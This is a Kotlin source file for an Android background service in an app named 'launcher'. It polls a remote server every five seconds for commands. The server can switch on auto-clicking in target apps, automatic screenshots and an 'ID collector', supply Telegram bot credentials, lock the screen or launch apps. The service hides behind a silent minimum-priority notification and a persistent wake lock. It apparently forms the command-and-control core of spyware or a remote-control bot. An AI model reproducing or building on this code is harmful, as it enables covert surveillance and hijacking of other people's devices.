package com.example.launcher

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class PollService : Service() {

    @Volatile
    private var running = false
    private var thread: Thread? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startInForeground()
        if (!running) {
            running = true
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "launcher:poll").apply {
                acquire()
            }
            thread = Thread { loop() }.also { it.start() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        thread?.interrupt()
        wakeLock?.let { if (it.isHeld) it.release() }
        super.onDestroy()
    }

    private fun loop() {
        val prefs = Prefs(this)
        val clock = SimpleDateFormat("HH:mm:ss", Locale.US)
        val api = ApiClient(Prefs.SERVER_URL, Prefs.TOKEN, prefs.deviceId)
        while (running) {
            try {
                val resp = api.poll()
                if (resp.autoClickEnabled != null) {
                    prefs.autoClickEnabled = resp.autoClickEnabled
                }
                if (resp.autoShotEnabled != null) {
                    prefs.autoShotEnabled = resp.autoShotEnabled
                    if (!resp.autoShotEnabled) {
                        MonitorAccessibilityService.instance?.stopScreenshotLoopNow()
                    }
                }
                if (resp.idCollectorEnabled != null) {
                    prefs.idCollectorEnabled = resp.idCollectorEnabled
                }
                if (resp.targetPackage != null) {
                    prefs.autoClickTargetPackage = resp.targetPackage
                }
                if (resp.steps != null) {
                    prefs.autoClickSteps = resp.steps
                }
                if (resp.triggerId != null) {
                    prefs.autoClickTriggerId = resp.triggerId
                }
                if (resp.botToken != null) {
                    prefs.telegramBotToken = resp.botToken
                }
                if (resp.chatId != null) {
                    prefs.telegramChatId = resp.chatId
                }

                prefs.lastStatus = "OK " + clock.format(Date())
                val cmd = resp.command
                if (cmd != null) {
                    if (cmd.pkg == "screen_off") {
                        MonitorAccessibilityService.instance?.lockScreenNow()
                        sendWithRetry(api, cmd.id, "launched")
                        prefs.lastStatus = "screen_off -> OK " + clock.format(Date())
                    } else {
                        val result = AppLauncher.launch(this, cmd.pkg)
                        sendWithRetry(api, cmd.id, result)
                        prefs.lastStatus = "${cmd.pkg} -> $result " + clock.format(Date())
                    }
                }
            } catch (e: InterruptedException) {
                break
            } catch (e: Exception) {
                prefs.lastStatus = "ERROR: ${e.message} " + clock.format(Date())
            }
            try {
                Thread.sleep(5000)
            } catch (e: InterruptedException) {
                break
            }
        }
    }

    private fun sendWithRetry(api: ApiClient, id: Int, result: String) {
        repeat(3) {
            try {
                api.sendResult(id, result)
                return
            } catch (e: Exception) {
                Thread.sleep(1500)
            }
        }
    }

    private fun startInForeground() {
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notif_channel),
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                description = ""
            }
            nm.createNotificationChannel(channel)
        }
        val open = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE
        )
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setContentIntent(open)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        } else {
            startForeground(NOTIF_ID, notification)
        }
    }

    companion object {
        private const val CHANNEL_ID = "launcher_silent_bg"
        private const val NOTIF_ID = 1
    }
}
